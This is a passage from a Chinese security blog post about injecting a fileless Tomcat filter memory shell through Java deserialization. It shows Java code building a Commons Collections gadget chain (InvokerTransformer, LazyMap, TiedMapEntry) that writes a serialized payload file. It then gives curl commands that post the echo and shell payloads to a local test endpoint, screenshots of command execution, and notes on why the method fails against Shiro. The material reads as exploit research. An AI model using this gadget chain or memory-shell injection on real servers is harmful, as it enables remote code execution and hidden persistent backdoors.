</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// tostrng
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        InvokerTransformer invokertransformer = <span style="color:#fff;font-weight:bold">new</span> InvokerTransformer(<span style="color:#0ff;font-weight:bold">&#34;toString&#34;</span>, <span style="color:#fff;font-weight:bold">new</span> Class[0], <span style="color:#fff;font-weight:bold">new</span> Object[0]);
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">//===============
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        Map innerMap = <span style="color:#fff;font-weight:bold">new</span> HashMap();
</span></span><span style="display:flex;"><span>        Map outerMap = LazyMap.<span style="color:#007f7f">decorate</span>(innerMap, invokertransformer);
</span></span><span style="display:flex;"><span>        TiedMapEntry tme = <span style="color:#fff;font-weight:bold">new</span> TiedMapEntry(outerMap,<span style="color:#0ff;font-weight:bold">&#34;reus09&#34;</span>);
</span></span><span style="display:flex;"><span>        Map expMap = <span style="color:#fff;font-weight:bold">new</span> HashMap();
</span></span><span style="display:flex;"><span>        expMap.<span style="color:#007f7f">put</span>(tme, <span style="color:#0ff;font-weight:bold">&#34;reus09&#34;</span>);
</span></span><span style="display:flex;"><span>        innerMap.<span style="color:#007f7f">remove</span>(obj);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        setFieldValue(invokertransformer, <span style="color:#0ff;font-weight:bold">&#34;iMethodName&#34;</span>,<span style="color:#0ff;font-weight:bold">&#34;newTransformer&#34;</span> );
</span></span><span style="display:flex;"><span>        setFieldValue(tme,<span style="color:#0ff;font-weight:bold">&#34;key&#34;</span>,obj);
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// ==============
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#007f7f">// 生成序列化字符串
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>				
</span></span><span style="display:flex;"><span>      	<span style="color:#007f7f">// ObjectOutputStream oss = new ObjectOutputStream(new FileOutputStream(&#34;./TomcatEchoInject.ser&#34;));
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        ObjectOutputStream oss = <span style="color:#fff;font-weight:bold">new</span> ObjectOutputStream(<span style="color:#fff;font-weight:bold">new</span> FileOutputStream(<span style="color:#0ff;font-weight:bold">&#34;./TomcatShellInject.ser&#34;</span>));
</span></span><span style="display:flex;"><span>        oss.<span style="color:#007f7f">writeObject</span>(expMap);
</span></span><span style="display:flex;"><span>        oss.<span style="color:#007f7f">close</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后利用 curl 进行注入即可</p>
<p>首先注入<code> TomcatEchoInject.ser</code></p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>curl http://localhost:8080/evil --data-binary &#34;@/Users/xxx/xxx/TomcatEchoInject.ser&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后注入<code>TomcatShellInject.ser</code></p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>curl http://localhost:8080/evil --data-binary &#34;@/Users/xxx/xxx/TomcatShellInject.ser&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230417150051140.png" alt="image-20230417150051140"  />
</p>
<p>可以看到服务端报错，说明恶意的<code>AbstractTranslet</code>已成功反序列化。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230417150248445.png" alt="image-20230417150248445"  />
</p>
<p>并且在内存中也可以看到优先执行我们自定义的Filter:<code>TomcatShellInject</code>.</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230417150433182.png" alt="image-20230417150433182"  />
</p>
<p>然后命令执行：</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230417150211328.png" alt="image-20230417150211328"  />
</p>
<h2 id="瑕疵">瑕疵<a hidden class="anchor" aria-hidden="true" href="#瑕疵">#</a></h2>
<p>这种利用方式实现了无落地的内存马注入，但是也有小缺陷，对于Shiro组件的系统无法实现，因为在<code>org.apache.catalina.core.ApplicationFilterChain#internalDoFilter</code>方法中，在对<code>lastServicedRequest</code>和<code>lastServicedResponse</code>赋值前，会先执行<code>filter.doFilter(request, response, this)</code>，执行完所有的Filter。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230417014616999.png" alt="image-20230417014616999"  />
</p>
<p>但是在<code>Shiro</code>中，其实就是自己实现的filter</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230417111016160.png" alt="image-20230417111016160"  />
</p>
<p>我们的Shiro反序列化漏洞触发点：<code>org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity</code>方法里面调用了<code>org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals</code>方法，在里面对传入的bytes进行AES解密后进行反序列化。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230417111849641.png" alt="image-20230417111849641"  />
</p>
<p>Shiro的RemberMe功能其实在<code>org.apache.shiro.web.servlet.AbstractShiroFilter#doFilterInternal</code>方法里面通过<code>createSubject</code>里面逐步实现。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230417111719177.png" alt="image-20230417111719177"  />
</p>
<p>因此对于Shiro的反序列化，在对<code>lastServicedRequest</code>和<code>lastServicedResponse</code>赋值前，先执行Shiro的Filter，在Filter里面存在反序列化触发点，而这个时候我们的<code>lastServicedRequest</code>和<code>lastServicedResponse</code>还未赋值，因此无法通杀Shiro。</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="/en/tags/%E5%86%85%E5%AD%98%E9%A9%AC/">内存马</a></li>
    </ul>
<nav class="paginav">
  <a class="next" href="/en/posts/tech/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/">
    <span class="title">Next »</span>
    <br>
    <span>Tomcat内存马</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2023 <a href="en/">Reus09&#39;s Blog</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
